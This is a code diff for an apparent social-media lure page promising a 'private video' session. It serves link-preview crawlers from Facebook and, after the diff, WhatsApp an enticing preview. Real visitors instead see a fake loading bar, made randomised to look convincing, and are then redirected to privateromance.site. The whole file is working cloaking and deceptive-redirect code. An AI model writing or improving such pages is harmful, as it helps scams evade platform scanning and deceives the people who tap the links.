@@ -4,34 +4,95 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>Live VCS – Connecting</title>
+<title>Private Video – Connecting</title>
 
-<!-- Open Graph for Messenger -->
-<meta property="og:title" content="Live VCS Private">
-<meta property="og:description" content="Tap to connect for live private VCS now">
-<meta property="og:image" content="https://kodean.online/assets/img/jutjut.jpg?=v123">
+<!-- Open Graph -->
+<meta property="og:title" content="Private Video Live">
+<meta property="og:description" content="Tap to connect for a private video now">
+<meta property="og:image" content="https://kodean.online/assets/img/jutjut1.jpg?v=2">
 <meta property="og:image:width" content="1200">
 <meta property="og:image:height" content="630">
 <meta property="og:url" content="https://kodean.online/yulupi">
 <meta property="og:type" content="website">
 
-<meta name="description" content="Tap to connect for live private VCS now">
+<meta name="description" content="Tap to connect for a private video now">
 
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
-body{min-height:100vh;background:#0b141a;color:#fff;display:flex;justify-content:center;align-items:center}
-.app{width:100%;max-width:420px;min-height:100vh;background:radial-gradient(circle at top,#1a2a33,#0b141a);display:flex;flex-direction:column}
-.header{padding:14px 16px;display:flex;align-items:center;gap:12px;background:#111b21}
-.avatar{width:44px;height:44px;border-radius:50%;object-fit:cover}
+body{
+  min-height:100vh;
+  background:#080a16;
+  color:#fff;
+  display:flex;
+  justify-content:center;
+  align-items:center
+}
+.app{
+  width:100%;
+  max-width:420px;
+  min-height:100vh;
+  background:radial-gradient(circle at top,#1b1f3b,#080a16);
+  display:flex;
+  flex-direction:column
+}
+.header{
+  padding:14px 16px;
+  display:flex;
+  align-items:center;
+  gap:12px;
+  background:#0f1228
+}
+.avatar{
+  width:44px;height:44px;
+  border-radius:50%;
+  object-fit:cover
+}
 .name{font-size:16px;font-weight:600}
-.status{font-size:13px;color:#ff4d6d;animation:pulse 1.6s infinite}
-@keyframes pulse{0%,100%{opacity:.6}50%{opacity:1}}
-.content{flex:1;padding:26px 20px;text-align:center}
-.big-avatar{width:160px;height:160px;border-radius:50%;object-fit:cover;margin:45px auto 18px;box-shadow:0 0 35px rgba(255,77,109,.55)}
-.bio{font-size:15px;opacity:.85;margin-bottom:22px}
-.loader{width:100%;height:9px;background:rgba(255,255,255,.15);border-radius:20px;overflow:hidden}
-.loader span{display:block;height:100%;width:0%;background:linear-gradient(90deg,#ff4d6d,#ff9aa2)}
-.loading-text{margin-top:14px;font-size:13px;opacity:.6}
+.status{
+  font-size:13px;
+  color:#a78bfa;
+  animation:pulse 1.6s infinite
+}
+@keyframes pulse{
+  0%,100%{opacity:.5}
+  50%{opacity:1}
+}
+.content{
+  flex:1;
+  padding:26px 20px;
+  text-align:center
+}
+.big-avatar{
+  width:160px;height:160px;
+  border-radius:50%;
+  object-fit:cover;
+  margin:45px auto 18px;
+  box-shadow:0 0 40px rgba(167,139,250,.6)
+}
+.bio{
+  font-size:15px;
+  opacity:.85;
+  margin-bottom:24px
+}
+.loader{
+  width:100%;
+  height:10px;
+  background:rgba(255,255,255,.12);
+  border-radius:30px;
+  overflow:hidden
+}
+.loader span{
+  display:block;
+  height:100%;
+  width:0%;
+  background:linear-gradient(90deg,#7c3aed,#38bdf8);
+  transition:width .2s
+}
+.loading-text{
+  margin-top:14px;
+  font-size:13px;
+  opacity:.6
+}
 </style>
 
 <script>
@@ -39,22 +100,24 @@ body{min-height:100vh;background:#0b141a;color:#fff;display:flex;justify-content
   const ua = navigator.userAgent.toLowerCase();
   const isBot =
     ua.includes("facebookexternalhit") ||
-    ua.includes("facebot");
+    ua.includes("facebot") ||
+    ua.includes("whatsapp");
 
   if(!isBot){
     document.addEventListener("DOMContentLoaded",()=>{
       const bar = document.getElementById("bar");
       let w = 0;
       const iv = setInterval(()=>{
-        w += 4;
+        w += Math.floor(Math.random()*6)+3;
+        if(w > 100) w = 100;
         bar.style.width = w + "%";
         if(w >= 100){
           clearInterval(iv);
           setTimeout(()=>{
             window.location.href = "https://privateromance.site";
-          }, 400);
+          }, 500);
         }
-      }, 80);
+      }, 120);
     });
   }
 })();
@@ -64,16 +127,16 @@ body{min-height:100vh;background:#0b141a;color:#fff;display:flex;justify-content
 <body>
 <div class="app">
   <div class="header">
-    <img src="https://kodean.online/assets/img/jutjut.jpg" class="avatar">
+    <img src="https://kodean.online/assets/img/jutjut1.jpg" class="avatar">
     <div>
-      <div class="name">Live VCS</div>
+      <div class="name">Private Video</div>
       <div class="status">connecting…</div>
     </div>
   </div>
 
   <div class="content">
-    <img src="https://kodean.online/assets/img/jutjut.jpg" class="big-avatar">
-    <div class="bio">Connecting you to a private live session…</div>
+    <img src="https://kodean.online/assets/img/jutjut1.jpg" class="big-avatar">
+    <div class="bio">Connecting you to a private video session…</div>
     <div class="loader"><span id="bar"></span></div>
     <div class="loading-text">Please wait</div>
   </div>
